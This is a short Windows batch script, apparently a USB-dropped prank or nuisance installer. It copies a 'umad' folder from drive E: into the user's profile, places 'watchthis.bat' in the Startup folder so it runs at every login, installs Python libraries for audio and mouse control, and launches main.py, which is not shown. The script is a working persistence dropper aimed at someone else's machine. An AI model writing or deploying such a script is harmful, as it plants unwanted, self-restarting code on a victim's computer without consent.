@echo off
mkdir C:\users\%USERNAME%\umad
xcopy E:\umad C:\users\%USERNAME%\umad /v /q /c /y 
copy watchthis.bat C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup /v /y

pip install pycaw
pip install comtypes
pip install playsound==1.2.2
pip install mouse

python C:\users\%USERNAME%\umad\main.py

